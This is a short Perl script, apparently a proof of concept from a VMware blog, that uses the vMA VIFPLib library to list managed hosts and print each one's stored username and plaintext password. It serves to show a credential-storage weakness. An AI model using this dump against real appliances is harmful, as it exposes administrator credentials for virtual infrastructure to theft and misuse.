#!/usr/bin/perl -w
# Author: William Lam
# Website: www.virtuallyghetto.com
# Reference: http://www.virtuallyghetto.com/2010/08/why-you-should-upgrade-from-vma-40-to.html

use strict;
use VMware::VIFPLib;

my @targets = VIFPLib::enumerate_targets();
my $vifplib = vifplib_perl::CreateVIFPLib();
my $viuser = vifplib_perl::CreateVIUserInfo();

if ($#targets ne -1) {
	foreach my $target (@targets) {
		eval { $vifplib->QueryTarget($target, $viuser); };
		if(!$@) {
			my $username = $viuser->GetUsername();
	                my $password = $viuser->GetPassword();
			print "Hostname: " . $target . "\tUsername: " . $username . "\tPassword: " . $password . "\n";
		}
   	}
}
